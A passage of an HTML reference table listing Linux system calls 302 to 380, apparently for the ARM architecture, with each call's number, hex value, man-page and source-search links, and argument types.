msgflg</td><td>-</td><td>-</td></tr><tr><td align="center">302</td><td>msgrcv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgrcv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgrcv">cs/</a></td><td align="center">0x12e</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>long msgtyp</td><td>int msgflg</td><td>-</td></tr><tr><td align="center">303</td><td>msgget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgget">cs/</a></td><td align="center">0x12f</td><td>key_t key</td><td>int msgflg</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">304</td><td>msgctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgctl">cs/</a></td><td align="center">0x130</td><td>int msqid</td><td>int cmd</td><td>struct msqid_ds *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">305</td><td>shmat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmat">cs/</a></td><td align="center">0x131</td><td>int shmid</td><td>char *shmaddr</td><td>int shmflg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">306</td><td>shmdt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmdt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmdt">cs/</a></td><td align="center">0x132</td><td>char *shmaddr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">307</td><td>shmget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmget">cs/</a></td><td align="center">0x133</td><td>key_t key</td><td>size_t size</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">308</td><td>shmctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmctl">cs/</a></td><td align="center">0x134</td><td>int shmid</td><td>int cmd</td><td>struct shmid_ds *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">309</td><td>add_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/add_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*add_key">cs/</a></td><td align="center">0x135</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td>-</td></tr><tr><td align="center">310</td><td>request_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/request_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*request_key">cs/</a></td><td align="center">0x136</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td>-</td></tr><tr><td align="center">311</td><td>keyctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/keyctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*keyctl">cs/</a></td><td align="center">0x137</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">312</td><td>semtimedop</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semtimedop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semtimedop">cs/</a></td><td align="center">0x138</td><td>int semid</td><td>struct sembuf *sops</td><td>unsigned nsops</td><td>const struct __kernel_timespec *timeout</td><td>-</td><td>-</td></tr><tr><td align="center">313</td><td>vserver</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vserver.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vserver">cs/</a></td><td align="center">0x139</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">314</td><td>ioprio_set</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_set.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_set">cs/</a></td><td align="center">0x13a</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">315</td><td>ioprio_get</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_get.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_get">cs/</a></td><td align="center">0x13b</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">316</td><td>inotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init">cs/</a></td><td align="center">0x13c</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">317</td><td>inotify_add_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_add_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_add_watch">cs/</a></td><td align="center">0x13d</td><td>int fd</td><td>const char *path</td><td>u32 mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">318</td><td>inotify_rm_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_rm_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_rm_watch">cs/</a></td><td align="center">0x13e</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">319</td><td>mbind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mbind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mbind">cs/</a></td><td align="center">0x13f</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td align="center">320</td><td>get_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_mempolicy">cs/</a></td><td align="center">0x140</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">321</td><td>set_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_mempolicy">cs/</a></td><td align="center">0x141</td><td>int mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">322</td><td>openat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/openat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*openat">cs/</a></td><td align="center">0x142</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td></tr><tr><td align="center">323</td><td>mkdirat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdirat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdirat">cs/</a></td><td align="center">0x143</td><td>int dfd</td><td>const char * pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">324</td><td>mknodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknodat">cs/</a></td><td align="center">0x144</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td></tr><tr><td align="center">325</td><td>fchownat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchownat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchownat">cs/</a></td><td align="center">0x145</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td>-</td></tr><tr><td align="center">326</td><td>futimesat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futimesat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futimesat">cs/</a></td><td align="center">0x146</td><td>int dfd</td><td>const char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">327</td><td>fstatat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatat64">cs/</a></td><td align="center">0x147</td><td>int dfd</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>int flag</td><td>-</td><td>-</td></tr><tr><td align="center">328</td><td>unlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlinkat">cs/</a></td><td align="center">0x148</td><td>int dfd</td><td>const char * pathname</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">329</td><td>renameat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat">cs/</a></td><td align="center">0x149</td><td>int olddfd</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td></tr><tr><td align="center">330</td><td>linkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/linkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*linkat">cs/</a></td><td align="center">0x14a</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>int flags</td><td>-</td></tr><tr><td align="center">331</td><td>symlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlinkat">cs/</a></td><td align="center">0x14b</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">332</td><td>readlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlinkat">cs/</a></td><td align="center">0x14c</td><td>int dfd</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td></tr><tr><td align="center">333</td><td>fchmodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmodat">cs/</a></td><td align="center">0x14d</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">334</td><td>faccessat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/faccessat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*faccessat">cs/</a></td><td align="center">0x14e</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">335</td><td>pselect6</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pselect6.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pselect6">cs/</a></td><td align="center">0x14f</td><td>int</td><td>fd_set *</td><td>fd_set *</td><td>fd_set *</td><td>struct __kernel_timespec *</td><td>void *</td></tr><tr><td align="center">336</td><td>ppoll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ppoll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ppoll">cs/</a></td><td align="center">0x150</td><td>struct pollfd *</td><td>unsigned int</td><td>struct __kernel_timespec *</td><td>const sigset_t *</td><td>size_t</td><td>-</td></tr><tr><td align="center">337</td><td>unshare</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unshare.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unshare">cs/</a></td><td align="center">0x151</td><td>unsigned long unshare_flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">338</td><td>set_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_robust_list">cs/</a></td><td align="center">0x152</td><td>struct robust_list_head *head</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">339</td><td>get_robust_list</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_robust_list.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_robust_list">cs/</a></td><td align="center">0x153</td><td>int pid</td><td>struct robust_list_head * *head_ptr</td><td>size_t *len_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">340</td><td>splice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/splice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*splice">cs/</a></td><td align="center">0x154</td><td>int fd_in</td><td>loff_t *off_in</td><td>int fd_out</td><td>loff_t *off_out</td><td>size_t len</td><td>unsigned int flags</td></tr><tr><td align="center">341</td><td>arm_sync_file_range</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/arm_sync_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*arm_sync_file_range">cs/</a></td><td align="center">0x155</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">341</td><td>sync_file_range2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync_file_range2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync_file_range2">cs/</a></td><td align="center">0x155</td><td>int fd</td><td>unsigned int flags</td><td>loff_t offset</td><td>loff_t nbytes</td><td>-</td><td>-</td></tr><tr><td align="center">342</td><td>tee</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tee.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tee">cs/</a></td><td align="center">0x156</td><td>int fdin</td><td>int fdout</td><td>size_t len</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">343</td><td>vmsplice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vmsplice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vmsplice">cs/</a></td><td align="center">0x157</td><td>int fd</td><td>const struct iovec *iov</td><td>unsigned long nr_segs</td><td>unsigned int flags</td><td>-</td><td>-</td></tr><tr><td align="center">344</td><td>move_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/move_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*move_pages">cs/</a></td><td align="center">0x158</td><td>pid_t pid</td><td>unsigned long nr_pages</td><td>const void * *pages</td><td>const int *nodes</td><td>int *status</td><td>int flags</td></tr><tr><td align="center">345</td><td>getcpu</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcpu.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcpu">cs/</a></td><td align="center">0x159</td><td>unsigned *cpu</td><td>unsigned *node</td><td>struct getcpu_cache *cache</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">346</td><td>epoll_pwait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_pwait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_pwait">cs/</a></td><td align="center">0x15a</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>const sigset_t *sigmask</td><td>size_t sigsetsize</td></tr><tr><td align="center">347</td><td>kexec_load</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kexec_load.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kexec_load">cs/</a></td><td align="center">0x15b</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td>-</td><td>-</td></tr><tr><td align="center">348</td><td>utimensat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimensat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimensat">cs/</a></td><td align="center">0x15c</td><td>int dfd</td><td>const char *filename</td><td>struct __kernel_timespec *utimes</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">349</td><td>signalfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd">cs/</a></td><td align="center">0x15d</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">350</td><td>timerfd_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_create">cs/</a></td><td align="center">0x15e</td><td>int clockid</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">351</td><td>eventfd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd">cs/</a></td><td align="center">0x15f</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">352</td><td>fallocate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fallocate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fallocate">cs/</a></td><td align="center">0x160</td><td>int fd</td><td>int mode</td><td>loff_t offset</td><td>loff_t len</td><td>-</td><td>-</td></tr><tr><td align="center">353</td><td>timerfd_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_settime">cs/</a></td><td align="center">0x161</td><td>int ufd</td><td>int flags</td><td>const struct __kernel_itimerspec *utmr</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td></tr><tr><td align="center">354</td><td>timerfd_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timerfd_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timerfd_gettime">cs/</a></td><td align="center">0x162</td><td>int ufd</td><td>struct __kernel_itimerspec *otmr</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">355</td><td>signalfd4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/signalfd4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*signalfd4">cs/</a></td><td align="center">0x163</td><td>int ufd</td><td>sigset_t *user_mask</td><td>size_t sizemask</td><td>int flags</td><td>-</td><td>-</td></tr><tr><td align="center">356</td><td>eventfd2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/eventfd2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*eventfd2">cs/</a></td><td align="center">0x164</td><td>unsigned int count</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">357</td><td>epoll_create1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create1">cs/</a></td><td align="center">0x165</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">358</td><td>dup3</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup3.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup3">cs/</a></td><td align="center">0x166</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">359</td><td>pipe2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe2">cs/</a></td><td align="center">0x167</td><td>int *fildes</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">360</td><td>inotify_init1</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init1.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init1">cs/</a></td><td align="center">0x168</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">361</td><td>preadv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv">cs/</a></td><td align="center">0x169</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">362</td><td>pwritev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev">cs/</a></td><td align="center">0x16a</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>unsigned long pos_l</td><td>unsigned long pos_h</td><td>-</td></tr><tr><td align="center">363</td><td>rt_tgsigqueueinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_tgsigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_tgsigqueueinfo">cs/</a></td><td align="center">0x16b</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>siginfo_t *uinfo</td><td>-</td><td>-</td></tr><tr><td align="center">364</td><td>perf_event_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/perf_event_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*perf_event_open">cs/</a></td><td align="center">0x16c</td><td>struct perf_event_attr *attr_uptr</td><td>pid_t pid</td><td>int cpu</td><td>int group_fd</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">365</td><td>recvmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmmsg">cs/</a></td><td align="center">0x16d</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">366</td><td>accept4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept4">cs/</a></td><td align="center">0x16e</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>int</td><td>-</td><td>-</td></tr><tr><td align="center">367</td><td>fanotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_init">cs/</a></td><td align="center">0x16f</td><td>unsigned int flags</td><td>unsigned int event_f_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">368</td><td>fanotify_mark</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_mark.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_mark">cs/</a></td><td align="center">0x170</td><td>int fanotify_fd</td><td>unsigned int flags</td><td>u64 mask</td><td>int fd</td><td>const char *pathname</td><td>-</td></tr><tr><td align="center">369</td><td>prlimit64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prlimit64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prlimit64">cs/</a></td><td align="center">0x171</td><td>pid_t pid</td><td>unsigned int resource</td><td>const struct rlimit64 *new_rlim</td><td>struct rlimit64 *old_rlim</td><td>-</td><td>-</td></tr><tr><td align="center">370</td><td>name_to_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/name_to_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*name_to_handle_at">cs/</a></td><td align="center">0x172</td><td>int dfd</td><td>const char *name</td><td>struct file_handle *handle</td><td>int *mnt_id</td><td>int flag</td><td>-</td></tr><tr><td align="center">371</td><td>open_by_handle_at</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open_by_handle_at">cs/</a></td><td align="center">0x173</td><td>int mountdirfd</td><td>struct file_handle *handle</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">372</td><td>clock_adjtime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_adjtime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_adjtime">cs/</a></td><td align="center">0x174</td><td>clockid_t which_clock</td><td>struct __kernel_timex *tx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">373</td><td>syncfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syncfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syncfs">cs/</a></td><td align="center">0x175</td><td>int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">374</td><td>sendmmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmmsg">cs/</a></td><td align="center">0x176</td><td>int fd</td><td>struct mmsghdr *msg</td><td>unsigned int vlen</td><td>unsigned flags</td><td>-</td><td>-</td></tr><tr><td align="center">375</td><td>setns</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setns.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setns">cs/</a></td><td align="center">0x177</td><td>int fd</td><td>int nstype</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">376</td><td>process_vm_readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_readv">cs/</a></td><td align="center">0x178</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">377</td><td>process_vm_writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_writev">cs/</a></td><td align="center">0x179</td><td>pid_t pid</td><td>const struct iovec *lvec</td><td>unsigned long liovcnt</td><td>const struct iovec *rvec</td><td>unsigned long riovcnt</td><td>unsigned long flags</td></tr><tr><td align="center">378</td><td>kcmp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kcmp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kcmp">cs/</a></td><td align="center">0x17a</td><td>pid_t pid1</td><td>pid_t pid2</td><td>int type</td><td>unsigned long idx1</td><td>unsigned long idx2</td><td>-</td></tr><tr><td align="center">379</td><td>finit_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/finit_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*finit_module">cs/</a></td><td align="center">0x17b</td><td>int fd</td><td>const char *uargs</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">380</td><td>sched_setattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setattr">cs/</a></td><td align="center">0x17c</td><td>pid_t pid</td><td>struct 